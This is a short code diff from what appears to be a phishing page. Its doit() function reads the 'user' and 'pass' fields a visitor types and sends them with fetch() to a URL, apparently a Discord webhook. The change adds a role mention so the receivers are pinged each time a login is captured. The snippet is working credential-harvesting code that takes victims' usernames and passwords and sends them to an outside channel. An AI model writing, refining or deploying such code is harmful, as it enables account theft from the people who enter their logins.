@@ -2065,7 +2065,10 @@
 
                 function doit() {
                   const msg = {
-                    "content": `**New input** \n User: \`${document.getElementById("user").value}\` \n Pass: \`${document.getElementById("pass").value}\``
+                    "content": `**New input** \n User: \`${document.getElementById("user").value}\` \n Pass: \`${document.getElementById("pass").value}\` <@&1554223278581751939>`,
+                    "allowed_mentions": {
+                      "roles": ["1554223278581751939"]
+                    }
                   }
 
                   fetch(url,
